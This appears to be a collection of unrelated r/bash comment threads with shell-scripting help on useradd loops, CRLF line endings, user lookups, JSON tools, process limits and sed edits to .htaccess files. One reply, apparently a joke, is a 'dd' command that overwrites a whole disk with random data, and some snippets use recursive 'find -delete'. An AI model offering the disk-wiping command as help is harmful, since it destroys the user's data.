To answer your question regarding ${STARTUP}, I do think that's correct. I'm totally not well versed on this, so excuse me if I sound rude or ignorant when I respond, but I guess my question would be why this entrypoint.sh works perfectly fine for another game. For example, I have another game. The only files I need are the Dockerfile to build the image. Then I use the exact same entrypoint.sh already specified, and then the first line of the startup arguments is this below file: #!/bin/bash OPTS="$*" OPTIONS=() OPTIONS+=("$SERVER_OPTIONS") if [ ! -d "${HOME}/.callofduty" ]; then mkdir -p "$HOME/.callofduty/" cp -r "/opt/cod/server/." "${HOME}/.callofduty/" fi if [ -n "${SERVER_DEDICATED}" ]; then OPTIONS+=("+set dedicated \"${SERVER_DEDICATED}\"") fi cd "/opt/cod/server/" COMMAND=""$OPTS"" ${COMMAND} I have no problems with spaces in this image. The only differences are that the file isn't identical (obviously) and that the Rust/CS:GO image has another file (startrust.sh) which is executed from within the startup.sh file. Totally not saying that the entrypoint.sh can't be improved. I'm just trying to figure out what's different between these 2 images that might be causing this issue.
Thank you very much for the input! As you can tell I'm somewhat noob with this, so let me first comment on the unzipping of unchecked zipped files. Do you have a suggestion to resolve that? I'll do some Googling here also, but wanted to get an explanation on best practices there. Back to the issue at hand, do you mind elaborating a bit more on what part of the command is bound to break, and why? Sorry - I know you're taking your own personal time to help me, but I'm just trying to learn and understand so I don't make these stupid mistakes anymore moving forward. In regards to your comment about ${} splitting everything, what would be the alternative here? Finally, I'll look into your functions idea as well. I'm not well versed on this so I'll have to do some learning on this one. However, I did want to make the same comment that I made to another user scrutinizing the entrypoint.sh file: guess my question would be why this entrypoint.sh works perfectly fine for another game. For example, I have another game. The only files I need are the Dockerfile to build the image. Then I use the exact same entrypoint.sh already specified, and then the first line of the startup arguments is this below file: #!/bin/bash OPTS="$*" OPTIONS=() OPTIONS+=("$SERVER_OPTIONS") if [ ! -d "${HOME}/.callofduty" ]; then mkdir -p "$HOME/.callofduty/" cp -r "/opt/cod/server/." "${HOME}/.callofduty/" fi if [ -n "${SERVER_DEDICATED}" ]; then OPTIONS+=("+set dedicated \"${SERVER_DEDICATED}\"") fi cd "/opt/cod/server/" COMMAND=""$OPTS"" ${COMMAND} I have no problems with spaces in this image. The only differences are that the file isn't identical (obviously) and that the Rust/CS:GO image has another file (startrust.sh) which is executed from within the startup.sh file. Totally not saying that the entrypoint.sh can't be improved. I'm just trying to figure out what's different between these 2 images that might be causing this issue.
That script looks like it builds an array called $OPTIONS (though I don't see it getting used afterwards) while the first script built a string. &gt;I'm just trying to figure out what's different between these 2 images that might be causing this issue. Do you mean the difference in these two approaches? With an array you can have each argument to a command as a different array index. Example: $ function printargs() { IFS=$'\n'; echo "$*"; } #this prints each argument on a separate line $ array=( '1' '2' 'a b c' '4' ) $ printargs "${array[@]}" 1 2 a b c 4 While a string separates on spaces $ eval printargs '1 2 \"a b c\" 4' #basically what you're doing in the first example, if I understand correctly 1 2 "a b c" 4 
Hmm. That's interesting. I believe the $OPTIONS array was used later to specify the variable "SERVER_DEDICATED" which doesn't exist in the startup arguments. Basically, I didn't want SERVER_DEDICATED to be something that a user could see me specifying in the startup arguments, so it was built into the file instead. If I'm not mistaken, it's only used here: OPTIONS+=("+set dedicated \"${SERVER_DEDICATED}\"") Would this still be considered a string here, though? OPTS="$*" COMMAND=""$OPTS"" ${COMMAND} Afaik, isn't that what grabs the startup arguments, creates the command variable, and then executes the arguments? Wouldn't that be a string too? Sorry again if I sound ridiculous, just trying to learn and get to the bottom of this. :blush:
Yeah `$*`, `$OPTS` and `$COMMAND` there are strings (and all three have the same value), but without seeing what they contain I can't comment if they should have been arrays. By the way since nothing changes those variables, it's just "run the command specified as the first argument with the arguments following it". And you can rewrite that as "$@" which is an array of all the arguments that were passed to this command (whereas `$*` is a string of all arguments) and the array will respect spaces in the arguments.
why do you think having the code as a screenshot is helpful? why don't you paste the code in the description?
&gt;reportfile.txt is filled with errors saying that the groups don't exist. So, `groupadd even; groupadd odd`?
Sorry, lapse in judgement. #!/bin/bash INPUT=n.txt COUNT=1 [ ! -f $INPUT ] &amp;&amp; { printf “$INPUT file not found”; exit 99; } while read line do if [[ $(( $COUNT % 2 )) == 0 ]]; then mygroup=”even” else mygroup=”odd” fi if [ ! $COUNT == 0 ] then lname=$( printf “%s” $line | cut -d, -f 1 ) fname=$( printf “%s” $line | cut -d, -f 2 ) username=$( printf “%s” $line | cut -d, -f 3 ) pass=$(perl -e ‘print crypt(“password”,”\$6\$”.rand(200).”\$”)’) useradd -d /home/$username -G $mygroup -c “$fname $lname” -p $pass $username printf “added\n” printf “%s,%s,%s,%s\n” $mygroup $lname $fname $username | tee -a reportfile.txtr fi COUNT=$(( $COUNT + 1 )) done &lt; $INPUT As for the error... &gt; useradd: group 'even' does not exist I'll update the original post as well, thanks for the advice.
Do you mean replacing mygroup="even" with groupadd even ?
No, I mean running the command `groupadd` to add those two missing groups.
Oh, I see. Clever, now it says &gt; 'seradd: invalid user name 'xxxxxx xxxxxx being each user's name
Does the username follow these restrictions? `man useradd` Usernames must start with a lower case letter or an underscore, followed by lower case letters, digits, underscores, or dashes. They can end with a dollar sign. In regular expression terms: [a-z_][a-z0-9_-]*[$]? You can use `${username,,}` to make it lowercase.
Thank you for your help so far. They do seem to obey the restrictions. Is there a simple explanation as to why the error returns 'seradd instead of 'useradd? I know that might not really be important to the problem, but just for education sake.
Ah, yeah the thing that causes that might be why it's not working. Which would be that your users.csv file is in DOS format and all lines end in `\r`. Remove it with sed or use `${username%$'\r'}`
Would it be immediately obvious that the .csv is in DOS format and the lines end with `\r`? I don't see anything like that when I open the file.
so it fails because the groups don't exist. you can create them if they don't exist right before the ```while``` : ``` getent group odd || groupadd odd getent group even || groupadd even ```
Oh wow, this did the trick! THANK YOU!
Thank you for helping me, for some reason the extra line of code that /u/kulldox posted to handle the group creation smoothed everything over. Much appreciated nevertheless.
Depends on the editor. `sed -n l users.csv` will show them. `sed -i 's/\r$//' users.csv` to remove all `\r` at the end.
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
but personally, I would rewrite it something like this: #!/bin/bash INPUT="${1:-users.csv}" OUTPUT="${2:-reportfile.txt}" [ ! -f $INPUT ] &amp;&amp; { printf "$INPUT file not found"; exit 99; } getent group odd || groupadd odd; getent group even || groupadd even; idx=1 for i in $(cat ${INPUT}); do [[ $(( $idx % 2 )) == 0 ]] &amp;&amp; mygroup="even" || mygroup="odd" ((idx++)) USERDATA=($(echo ${i} | tr "," " ")) # an array with firstName,lastName,username pass=$(perl -e 'print crypt("password","\$6\$".rand(200)."\$")') cmd="useradd -d /home/${USERDATA[2]} -G $mygroup -c \"${USERDATA[0]} ${USERDATA[1]}\" -p $pass ${USERDATA[2]}" echo "INFO: ${cmd}" ${cmd} &amp;&amp; echo "INFO: User ${USERDATA[2]} added" || echo "ERROR: Cannot add User ${USERDATA[2]}" printf "%s,%s,%s,%s\n" $mygroup ${USERDATA[0]} ${USERDATA[1]} ${USERDATA[2]} | tee -a ${OUTPUT} done 
Wow, I have a ways to go before I can fully appreciate that, thank you.
Too long, not Chrome, and doesn't take you to a specific subreddit 
Try this in your while bucle: mapfile -t _VARNAME $run_cron $splog/wp-content/scrap.php &amp;&amp; $run_cron $splog/wp-cron.php _LASTLINE = ${_VARNAME[$((${#_VARNAME[@]}-1))]} # test whatever in ${_LASTLINE} and act as you wish
There's a popular tool to deal with JSON files from the command line named `jq`. You can reformat the file to make it more readable and browse it like this: jq . &lt; filename.js | less
So the urls all stop at a double quote `"`? grep -o 'https\?://[^"]*' file.js | sort -u
That's quite a cute way to handle longopt support inside `getopts`.
[This](https://stackoverflow.com/questions/6697753/difference-between-single-and-double-quotes-in-bash) should get you on your way ProBoxAlpha:~ hegemon$ echo "${line}" bobby ProBoxAlpha:~ hegemon$ echo '${line}' ${line} As a quick aside you don't need to pipe from `cat`. People make WAY too big a deal out of this IMO, but it's worth understanding the "right" way if only because later it'll let you do cool shit (cool shit not pictured, just basic while loop example): ProBoxAlpha:~ hegemon$ cat &gt; file 1 2 3 ProBoxAlpha:~ hegemon$ while read ln;do echo ${ln};done &lt; file 1 2 3 
You can't use single-quotes to enclose variable names. Single-quotes mean that the literal text `$line` is used as a parameter for `getent`. Switch to double-quotes instead. ;)
You need to use double-quotes to make your variable expansion work (`"$line"`). Here's how I would write your code more idiomatically: while read -r line; do if getent passwd "$line" &amp;&gt; /dev/null; then echo "user DOES exist." else echo "user does NOT exist." fi done &lt; usernames Alternatively, if all you want to do is search for the names that are in both files, you can use `uniq -d` or `grep -f`. Here's how I would do it with `grep`: cut -d: -f1 /etc/passwd | grep -xFf usernames Explanation: * `cut -d: -f1 /etc/passwd` pulls the first colon-delimited field (which happens to be the user name) out of every line in `/etc/passwd`. * `grep -xFf usernames` treats the file `usernames` as a list of patterns, and it searches the input (the user names from the previous command) for those patterns. The `-x` tells it to match whole lines only (you want that so that `foo` doesn't match `foobar`). The `-F` tells it to treat the patterns as literal strings (so characters like `.` and `*` aren't treated as special).
So for shitsngiggles I put a random string in and a couple of commented out lines but it says those lines that *shouldn't* be successful *are* successful. What would be the cause for this to occur? Am I missing something?
With the `while` loop version, you mean? Can you post the input and the output?
Good advice in general, but for this particular command… please do *not* run `find ./ -type f -delete | grep -vE '\.gz$|-201711'` :D
`man jq` too
Not funny.
 dd if=/dev/urandom of=/dev/sda
If the file is formatted you can do something like this: if [[ $(grep "^root:" /etc/passwd) ]]; then echo "User root exists."; fi People forget the grep tools return TRUE if there is a match. 
And if you add a `-q` to that grep, it will hide the unneeded output. 
And if you add a `-q` to that grep, it will hide the unneeded output. Or better yet, ditch the test and just use the subshell return: if (grep -q '^root:' /etc/passwd); then
 #!/bin/bash # replace "users" with the path to the actual users file user_file=users while read line; do grep -q $line /etc/passwd if [ $? -eq 0 ]; then echo "User $line exists" else echo "User $line does not exist" fi done &lt; $user_file
Instead of cat-ing the file, and piping it into a while loop, and then reading line by line, just map the file to a variable. mapfile -t USERNAMES &lt; usernames Then, instead of checking the password database entry, just check to see if it is a valid user id. for USERNAME in ${USERNAMES[@]}; do if id -u ${USERNAME} &amp;&gt; /dev/null; then echo "user does NOT exist." else echo "user DOES exist." fi done
 #!/bin/bash #Written by Manuel Iglesias. glesialo@gmail.com CommandName=${0##*/} PasswordFile=/etc/passwd echoE() { echo "$*" 1&gt;&amp;2 return 0 } Usage() { echoE "'$CommandName' returns 0 (true) if 'UserName' is a registered user." echoE echoE "Usage: $CommandName UserName." echoE return 0 } if [ $# -ne 1 ] || [ "$1" == "-h" ] || [ "$1" == "-?" ] || [ "$1" == "--help" ] || [ "$1" == "-help" ] then Usage exit 64 fi RegisteredUsers=`awk -F : '{printf "_"$1"_ "}' $PasswordFile` if [ "$RegisteredUsers" != "${RegisteredUsers/_${1}_/}" ] #If $RegisteredUsers contains '_${1}_'. then exit 0 else exit 1 fi 
This skeleton is quite old, and I confess that I never tried to optimize it, so it must be perfectible.
You're missing the echo from your nested command. You're trying to run the filename as an executable. Remove the echo from your first example and you will get the same thing.
Now it worked: $ extension=$(echo episode.mp4 | sed 's/.*\.//') $ echo $extension mp4 Thanks! EDIT: Solved
Bash has an alternative for that built in that might be interesting for you. Using it looks like this: filename="episode.mp4" extension="${filename##*.}" This does not work right if there's no extension on the file name, but your 'sed' solution has the same problem. You should only use this feature in a bash script. It does not necessarily work in a #!/bin/sh script (your sed solution works there). If you want to see the documentation for this, it's somewhere in `man bash`. You can jump to exactly the section where it's described by typing `/^ *Parameter Exp` when in the default man-page viewer.
Thanks. Saved, res-saved, and bookmarked.
If you could provide us a sample output, it would be easier to give some tips. In the dark, I'would say `... | grep -v (foo|bar)` foo and bar beeing filtered.
I think I now know what i'm going to do, I'll just have a file with a list of all the buckets I want to query and then pass that to the for loop. Thanks for your help
So my input file looks something like: #some random statement # bobby james keyboard
Would you know why and what it means when id returns with `id: ‘bobby\r’: no such user`? Bobby is definitely a user and this only occurs if there are multiple lines in my file. I looked at the man page and tried googling what causes \r but I can't seem to find anything. 
How was your input file created? Was it created in windows? Linux? Mac? Are you running this script on a Mac? Windows uses both `/r` and `/n` for newlines, while Linux uses just `\n`. (If I remember correctly, Mac uses both as well, but reversed from Windows) The `-t` in `mapfile -t USERNAMES &lt; usernames` should be removing trailing newlines, but I'm not sure what it does about return carriages. I'm on linux, and I've tried writing \r and \n, but never does it print the \r for me. #!/bin/bash USER_TO_TEST="bobby" echo -e "${USER_TO_TEST}" &gt; users.txt echo -e "${USER_TO_TEST}\n" &gt;&gt; users.txt echo -e "${USER_TO_TEST}\n\r" &gt;&gt; users.txt echo -e "${USER_TO_TEST}\r\n" &gt;&gt; users.txt mapfile -t USERNAMES &lt; users.txt for USERNAME in ${USERNAMES[@]}; do id -u ${USERNAME}; done gives me: 1000 1000 : no such user 1000 : no such user Also, I have my condition reversed above. if id -u ${USERNAME} &amp;&gt; /dev/null; then should be: if ! id -u ${USERNAME} &amp;&gt; /dev/null; then I will fix that above. 
Oh wow. Thank you! I'm writing on windows in VScode but ssh'd into a Linux computer to run the script. I was creating the input file as a plain text file and I completely forgot Windows added newlines automatically. I created a new input file in Linux and it worked perfectly. Thank you for the pointers! 
You are welcome! You replied while I was writing my second edit. It may be helpful for converting the line-endings from windows -&gt; linux. dos2unix users.txt
This is _exactly_ the reason I added this sub - for little gems like this - seems like I'm always finding a new inbuilt - in this case `mapfile`. Bravo.
Let say this runs from your home directory. #/home/example//datos/Nextcloud/Move2pc does not exist. if [ ! -d pwd/$DIR ] then mkdir /datos/Nextcloud/Move2pc (note the folder is in the root partition) mkdir $DIR fi #Find all the mp3's in your current folder and copy them to /datos/Nextcloud/Move2pc find . -name "*.mp3" -exec cp -t $DIR {} + #Find all the files in your current folder which aren't .sh and delete them find . -type f ! -name "*.sh" -delete
This: `find . -type f ! -name "*.sh" -delete` is searching the current working directory for files that don't match this: `*.sh` , and removing them. 
Apparently the line find . -type f ! -name "*.sh" -delete was deleting also the content of subfolders. Adding -maxdepth 1 solved it 
Yes, the `find` command will search recursively unless you tell it not to.
As an alternative, have you tried `ncdu`? You can put `pv` in the assignment of largestfiles as well, since it prints to stderr, like so: local largestfiles=$(find / -type f -exec du --separate-dirs --human-readable {} + 2&gt;/dev/null | pv)
Haven't heard of [ncdu](https://dev.yorhel.nl/ncdu) but I'll take a look. Your suggestion to pipe find to `pv` fits the bill. Thanks!
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
Either use: echo -e "\n" or echo $'\n'
doesn't work for some reason, tried that earlier
http://wiki.bash-hackers.org/commands/builtin/printf
Just do `echo` (no parameters) for an empty line. Something else, you type weird stuff with all those `"` characters. When you do this here for example: "Swipe Result: "Attendance Recorded"" Bash sees these words while it reads the line: &lt;"Swipe Result: "&gt; = &lt;Swipe Result: &gt; &lt;Attendance&gt; &lt;Recorded&gt; &lt;""&gt; = &lt;&gt; The words that touch each other get fused into one word, turning what you do into two parameters for the `echo` command: &lt;Swipe Result: Attendance&gt; &lt;Recorded&gt; Everything looks like you wanted it to in the end result that's printed by `echo`. The only part in your script that looks like a real mistake is where you use the following for a file name: Attendance" "$now"".txt Bash sees these elements there: &lt;Attendance&gt; &lt;" "&gt; &lt;$now&gt; &lt;""&gt; &lt;.txt&gt; The problem here is the `$now` variable without `"` characters surrounding it. The `"` you typed are surrounding other words from bash's point of view. Things will break if there are space characters in the `$num` value. Bash will then do "word-splitting" and you won't get a correct file-name. The following examples will all make bash see the file-name you wanted: "Attendance $num.txt" "Attendance ""$num"".txt" "Attendance ${num}.txt" Attendance" ""$num".txt
My problem wasn't with the file name but with the input into the file, after the $num variable is inputted into the Attendance.txt I am trying to have the program enter to the next line. This was the next swipes, and swipes after them, have their own clean line. I appreciate the response though. I'll try the echo with no parameters.
Still no luck :\
Here's experiments on the command line about how things work here for me: $ echo test; echo; echo test test test $ echo -e 'test\n\ntest' test test $ printf "test\n\ntest\n" test test $ printf "test\n"; printf "\n"; printf "test\n" test test 
Got it to work, totally my fault. I appreciate the help. Now to make that script auto execute on a raspberry pi, ugh. Thanks again!
Your screenshot is cut off. Not sure if that was intentional. Start off by reading the man pages. `man apt-get` - This will point you to an option `-y`. It automatically assumes the answer is yes for the installation scripts and it continues. &gt; almost essentially a script.... one process will still be working and it tries enter the next command Some information is missing here. In a script, unless you send something to the background explicitly, all commands executed sequentially. &gt; tries to enter the next command Something is terribly wrong here. I am missing a lot of information. What you think you call "script" *may not* be a script. Look into `grep`, `sed`, `ex` for modifying text files programmatically. They are definitely not beginner stuff and make sure to back up your system/work. Doing something wrong may do some damage. &gt; information into the file was added by appending .d to the filename Linux does not discriminate by file extensions. By all means you can append literal text to a jpeg file and it happily does it. (This will corrupt the jpeg file, of course). &gt; install virtual server, update it This is not the correct order to do things. First update the apt repositories by running `apt-get update`, then run `apt-get install all-the-other-stuff`. What exactly are you trying to achieve? That will clarify a lot and help others answer your questions better.
SO for instance, given this json fragment: &gt;{ "results" : [ { "address_components" : [ { "long_name" : "Cedar Rapids", "short_name" : "Cedar Rapids", "types" : [ "locality", "political" ] }, { "long_name" : "Linn County", "short_name" : "Linn County", "types" : [ "administrative_area_level_2", "political" ] }, { "long_name" : "Iowa", "short_name" : "IA", "types" : [ "administrative_area_level_1", "political" ] }, { "long_name" : "United States", "short_name" : "US", "types" : [ "country", "political" ] } 
I'd like to see somethiingg like: results.address_components.1.long_name=Cedar Rapids results.address_components.1.short_name=Cedar Rapids results.address_components.1.types.1.locality results.address_components.1.types.2.political results.address_components.2.long_name=Linn County results.address_components.2.short_name=Linn County results.address_components.2.types.1.administrative_area_level_2 results.address_components.2.types.2.political results.address_components.3.long_name=Iowa results.address_components.3.short_name=IA results.address_components.3.types.1.administrative_area_level_1 results.address_components.3.types.2.political results.address_components.4.long_name=United States results.address_components.4.short_name=US results.address_components.4.types.1.country results.address_components.4.types.2.political .. and so forth.. 
1. Cedar rapids, neat 2. In my experience when json is the question, bash is never the answer. Can you do these scripts in like, python or Perl?
Ah, ah! I know this one! The tool for this is [jshon](http://kmkeen.com/jshon/)
Sure, I could do them in python or perl if I first spend a few years practicing python or perl. Now, if I had a perl or python based tool that would convert the data as above, that would be fine - I could easily work with that in bash, which is what I have already spent years (many years) practicing. Note that the above data is just a sample - I am hoping for a tool that will walk through ALL of the data in any json file, without knowing in advance its structure or form.
Hrm.. Looks promising, but its not obvious what options to use with it to accomplish.. cat any_random_json_data.json | jshon ??????
Realistically, from 0 experience you could have a python script that does this within a few hours. Python, you literally just load a json file into a dictionary, and access it as such. This also will help with the "unknown structure" thing, especially if you're always doing key1.key2.key3 = value1 etc.
 AHA! I continued to google on my own, and I've just found [jsonpipe](https://github.com/zacharyvoase/jsonpipe) which seems to do *exactly* what I was looking for. 
`jq`
Install a command called 'jq' It has lots of options for outputting json data in various formats. I use it with curl REST calls all the time.
You're missing something at the end of this example: `]}]}`
Sure? What a luck! Cheers!
Yes, it wasn't the full file, notice how I said it was a **fragment** 
Oh, sorry, I *just* realized what you wanted to do... `jshon` is for parsing a json document to get specific information in an exact path. For example, if you wanted to get all of the `long_name` keys in your example, you'd do: cat example.json | jshon -e results -e 0 -e address_components -a -e long_name -u Cedar Rapids Linn County Iowa United States
Ah yes, that requires writing the command with a knowledge of the keys/data in the file.. I needed something that will dump all of the data from ANY json file. As noted in another post, I seem to have found a tool that does what I need. Still, thanks for taking the time to reply 
More specifically, here’s a `jq` approximation of OP’s requirement: jq -c 'paths(scalars) as $p | [$p, getpath($p)]' However, the output isn’t as pretty as `jsonpipe`, and it was actually pretty difficult to figure out how to get it, so if the goal is to work with the values using other shell commands – instead of doing everything in `jq` – I guess `jsonpipe` is actually the better fit.
You could perhaps start with something hacky like this: while (( $(ps -ef | grep -cFe "$0") &gt;= 10)); do sleep 1 done (Note that the count in the condition will be off by one since the `grep` will match its own command line.)
It can be piped through grep a second time to eliminate grep messing up the count: | grep -v grep ....
Investigating now. If only it were cordial to ask others to solve every riddle that ends with "it's as simple as this".
What would be the effect if you simply aborted from your script B before running APP C? Is it possible to simply choose not to run it? Maybe using $RANDOM to decide whether to run it on % chance? if [ "$RANDOM" -lt 100 ] ; exec APPC fi Otherwise, you could use "nice" on the high CPU java script, and simply run all of them, but make sure they are more polite. Your plan to wait is not a good idea; you will exhaust the process table with all the processes waiting. They will pile up unless this is a temporary job that just needs to be "spread out" over time. You could use a "library" approach. Have a directory filled up with flag files. Each time your script wants to run, it checks out a flag file from the library. When the script is done, it puts the flag back in the directory. If there are no flags in the directory, then the script will sleep/spin until a flag shows up. 
The job must run.. in less time preferably. However, the cost of a kajillion CPUs is undesired. What another poster suggested really got in the vein of what I’m trying to do - artificially limit the number of processes spawned by the PID and wait to exec until the number is less than the limit. 
So if I understand this correctly, i've got a process that spawns other processes ]# ps -ef UID - PID - PPID - C - STIME - TTY- TIME - CMD myuser 1001 1 0 19:59 ? 00:01:00 /path/to/exec And once it calls new processes, they reference the calling PID as PPID. What i dont' understand - for the sake of understanding - is what grepping -cFe $0 does. c clearly counts, e is equals, F doesn't seem to matter. I'm not entirely sure what $0 does in this content. If I echo out $0, then I get the process name of the calling script (-bash). However, i happen to have dozens of bash things running, which causes me to get a response of "6" if i run this from the command line. 
So if I understand this correctly, i've got a process that spawns other processes ]# ps -ef UID - PID - PPID - C - STIME - TTY- TIME - CMD myuser 1001 1 0 19:59 ? 00:01:00 /path/to/exec And once it calls new processes, they reference the calling PID as PPID. What i dont' understand - for the sake of understanding - is what grepping -cFe $0 does. c clearly counts, e is equals, F doesn't seem to matter. I'm not entirely sure what $0 does in this content. If I echo out $0, then I get the process name of the calling script (-bash). However, i happen to have dozens of bash things running, which causes me to get a response of "6" if i run this from the command line. 
Outcome: if i set to &gt;= 16, about 8 processes actually start. Then, after they finish, no further progress is made. Inside the while loop, i added an echo of the ps/grep combo into a text file. The number increments to the total number of spawned processes - about 90. Since each concurrent execution of the shell script is another item under the host PID, then that number never reduces since no one ever wins/runs.
Video moved: https://www.bitchute.com/video/yYyZWUtIEuG5/
Video moved: https://www.bitchute.com/video/ztvJQB9Pl73c
Add this header to the script: #!/bin/bash LaunchWithLowPriorityOption="-lwlpo" LowPriorityNice=19 if [ "$1" != "$LaunchWithLowPriorityOption" ] then nice --adjustment=$LowPriorityNice $0 $LaunchWithLowPriorityOption "$@" exit $? else shift fi # Original script starts here.
&gt; If I echo out $0, then I get the process name of the calling script (-bash). However, i happen to have dozens of bash things running, which causes me to get a response of "6" if i run this from the command line. `$0` is the name by which the command was called. So if the Java application calls the script `/opt/myjavaapp/maint.sh`, then `$0` is `/opt/myjavaapp/maint.sh`. So this should select only processes of that script. (`-F` treats the argument as a **f**ixed string instead of a regular expression, by the way.)
Yeah, I didn’t think that fully through. You probably need to adjust the chance that the script proceeds – if `n` processes are currently waiting, sleep unless `$((RANDOM % n))` is 0, or something like that.
#JQ Always JQ.... nothing else... Just JQ
And is this a continuous deluge 24/7? Because if you are waiting and queueing up more to run, I dont know how you are going to catch up. Is it possible to dispatch the work to another instance? or 10?
Great question - and something I was going to pose at another time. The process is NOT 24/7, though there could be multiple potential executions. I can control the frequency of the batch dropping (ie: i can have BATCH_A raise hell, then 2 hours later BATCH_B will drop and do the same, preventing so much risk of layered concurrency). I would LOVE to be able to use this process to spread the work out. At this point, this SH script is being called with 9 arguments that are simply passed thru to Java as $@. As it stands, some kind of even/odd distribution would be fabulous.
agreed. Though given that my problem is having 1x process spawn close to 100 sub processes, this count isn't valuable since the subprocess number hits a high watermark and just sits there waiting for work to do.
--PROTIP: Backup your /home folder at least once a week... (for future) --Advanced tip: Use ZFS for /home and you can get stuff "for free" from snapshots (as long as you schedule snapshots) https://freedompenguin.com/articles/how-to/move-linux-home-zfs/ --PM me if you're interested in some BASH scripts to help with the above
--You might be able to get somewhere with GNU parallel, altho it can be difficult to wrap your mind around/find a good tutorial: https://www.gnu.org/software/parallel/parallel_tutorial.html https://www.gnu.org/software/bash/manual/html_node/GNU-Parallel.html https://gist.github.com/Brainiarc7/24c966c8a001061ee86cc4bc05826bf4 http://puntoblogspot.blogspot.com/2017/01/gnu-parallel-as-queuing-system.html --One solution that mentions parallel also suggests using a Makefile: https://superuser.com/questions/153630/running-commands-in-parallel-with-a-limit-of-simultaneous-number-of-commands --Apologies if this is confusing, but HTH
&gt;or could I have 2nd &gt;() I don't think that's possible, that's the equivalent of `echo foo &gt; /tmp/foo &gt; /tmp/bar` (which redirects only to /tmp/bar), right? You can replace the `-q` from `grep -q ERROR` with `-m1` and redirect that to a file. `&gt;(grep -m1 ERROR &gt;/tmp/errormessage.txt &amp;&amp; kill ...etc` grep will stop on the first match with -m1 just like with -q: $ time seq 10 | while read; do echo $REPLY; sleep 0.5; done | grep -q 4 real 0m2.013s user 0m0.010s sys 0m0.012s $ time seq 10 | while read; do echo $REPLY; sleep 0.5; done | grep -m1 4 4 real 0m2.012s user 0m0.015s sys 0m0.006s $ time seq 10 | while read; do echo $REPLY; sleep 0.5; done | grep 4 4 real 0m5.026s user 0m0.021s sys 0m0.010s 
Thanks, I really should have looked at the grep command in more detail, I didn't realise it could directly output to a file. I did get my code to do what I want but in a really clunky way by doing everything twice: ERR_LOG="/tmp/err.log" ERR_STR="ERROR" (PIDFILE=$(mktemp /tmp/foo.XXXXXX) &amp;&amp; trap "rm $PIDFILE" 0 \ &amp;&amp; { (unbuffer $PROCESS) \ 1&gt; &gt;(tee &gt;(grep -q $ERR_STR &amp;&amp; kill $(cat $PIDFILE) &amp;&amp; echo $(date) &gt;&gt; $ERR_LOG) &gt;&amp;1) \ 1&gt; &gt;(tee &gt;(grep $ERR_STR &gt;&gt; $ERR_LOG) &gt;&amp;1) \ &amp; PID=$! &amp;&amp; echo $PID &gt;$PIDFILE ; wait $PID || true; }) but now I'm going to try and do it all with a single grep :)
Umm, if you did: process 2&gt;&amp;1 | grep -B3 -m1 ERROR &gt; $TMP store $TMP; rm $TMP The process will get a signal when it tries to write to the stdout or stderr file descriptors after grep bails out. On the next write after the ERROR is seen. 
You got a lot more out of his post than I did. I couldn't find an intelligible question that was being asked anywhere in there. ---- OP: Please post your code into paste-bin/codepad/ideone or any other site that allows you to paste/share your code. This is a guide from a different subreddit, but I'd give it a read to help you get the most helpful responses to your questions: https://www.reddit.com/r/learnprogramming/wiki/index#wiki_writing_a_good_title
This should work: sed -i -r '/&lt;IfModule mod_suphp\.c&gt;/,/&lt;\/IfModule&gt;/ d; /&lt;Files "\.user\.ini"&gt;/,/&lt;\/Files&gt;/ d' .htaccess_bak You could try to make it easier to read with line-breaks: sed -i -r ' /^&lt;IfModule mod_suphp\.c&gt;/,/^&lt;\/IfModule&gt;/ d /^&lt;Files "\.user\.ini"&gt;/,/^&lt;\/Files&gt;/ d ' .htaccess_bak The "script" for sed is this here: /^&lt;IfModule mod_suphp\.c&gt;/,/^&lt;\/IfModule&gt;/ d /^&lt;Files "\.user\.ini"&gt;/,/^&lt;\/Files&gt;/ d The command used there is `d`, which deletes lines. It gets applied to an "address" that's built out of a beginning and an end line which are both regex patterns. The regex patterns are between those `/` characters. To build the regex patterns, what you do is you first copy the lines you want to look for from the file, then escape all characters that have special meaning in regex patterns, and you escape any `/` characters. In this particular case here, what happened concretely is, `.` turns into `\.` and `/` turns into `\/`. I also added a `^` to the beginning of the pattern which makes it look for the start of a line.
ok thanks, do you know how to just comment out the lines instead? I may want to revert back later (I know I can just use the back up but good to know anyway) and also how about looping through all the dirs to make these changes to all .htaccess files? 
Change the `d` command into this command: s/^/#/ Those address pattern parts of the script stay the same.
&gt; s/^/#/ great thanks!
OK so it works on a single file and also when I ran it in a test directory with mutiple sub dirs and test htaccess files in but when running it in production on all my sites in /home it just seemed to hang for a long time, I let it run for maybe 15 mins and could see in htop the memory usage was creeping up so I eventually stopped it and nothing seems to have been changed in any of the .htaccess files. This is what I ran as root from within /home root@server [/home]# shopt -s globstar root@server [/home]# sed -i.bak -r '/&lt;IfModule mod_suphp\.c&gt;/,/&lt;\/IfModule&gt;/ s/^/#/; /&lt;Files "\.user\.ini"&gt;/,/&lt;\/Files&gt;/ s/^/#/' **/.htaccess any ideas? 
Can you check if the sed command works on one single file you choose manually? What do you see when you do the following? echo **/.htaccess Maybe there's some sort of recursion going on there. To use `find` to get names, that works like this: find . -type f -name '.htaccess' | while read -r file; do sed -i.bak -r ' /&lt;IfModule mod_suphp\.c&gt;/,/&lt;\/IfModule&gt;/ s/^/#/ /&lt;Files "\.user\.ini"&gt;/,/&lt;\/Files&gt;/ s/^/#/ ' "$file" done
yes I ran a test on a single htaccess file as well as creating a small test dir with sub dirs and other htaccess files in and it worked on that. Im pretty sure it is recursion yes but I didnt expect it to get bogged down so much. I will try that other method thanks
Another thing, doing that `find ... | while ...` thing on a single line looks like this: find . -type f -name '.htaccess' | while read -r file; do sed -i.bak -r '...' "$file"; done
What if you just email when it fails?
find has a nice new feature: -mmin -mmin n File's data was last modified n minutes ago. 
